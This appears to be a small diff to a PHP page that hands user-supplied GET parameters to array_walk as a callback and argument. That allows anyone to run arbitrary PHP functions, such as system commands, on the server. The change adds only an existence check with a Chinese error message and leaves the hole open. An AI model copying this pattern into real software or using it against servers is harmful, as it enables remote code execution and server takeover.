@@ -16,8 +16,15 @@
 <br>
 <?php
 if (isset($_GET['callback']) && isset($_GET['command'])) {
-    $items = array($_GET['command'], "placeholder");
-    array_walk($items, $_GET['callback']);
+	if (! function_exists($_GET['callback']))
+	{
+		echo '该方法不存在: ', htmlentities($_GET['callback']), '<br/>';
+	}
+	else
+	{
+    	$items = array($_GET['command'], "placeholder");
+    	array_walk($items, $_GET['callback']);
+	}
 }
 ?>
 </body>
